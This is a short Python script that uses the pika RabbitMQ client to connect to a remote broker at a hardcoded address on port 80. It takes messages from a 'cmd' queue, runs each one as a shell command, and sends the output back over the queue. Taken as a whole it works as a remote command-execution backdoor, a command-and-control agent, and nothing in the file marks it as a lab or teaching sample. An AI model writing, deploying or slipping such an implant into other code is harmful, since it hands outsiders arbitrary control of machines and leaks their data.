import pika
import subprocess

auth = pika.credentials.PlainCredentials(username='Da', password='Da')
connection = pika.BlockingConnection(pika.ConnectionParameters(
            host='1.1.1.1',
            port=80,
            credentials=auth))

channel = connection.channel()
channel.queue_declare(queue='cmd')


def callback(ch, method, props, body):
    data, err = subprocess.Popen(body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    ch.basic_publish(exchange='',
                     routing_key=props.reply_to,
                     properties=pika.BasicProperties(correlation_id=props.correlation_id),
                     body=str(data)
                     )

    ch.basic_ack(delivery_tag=method.delivery_tag)
    print('Response commands result to Queue.')

if __name__ == '__main__':
    try:
        channel.basic_qos(prefetch_count=1)
        channel.basic_consume(callback, queue='cmd')
        print(' [*] Waiting for messages. To exit press CTRL+C')
        channel.start_consuming()
    except KeyboardInterrupt:
        print('Exit.\n')
        exit()
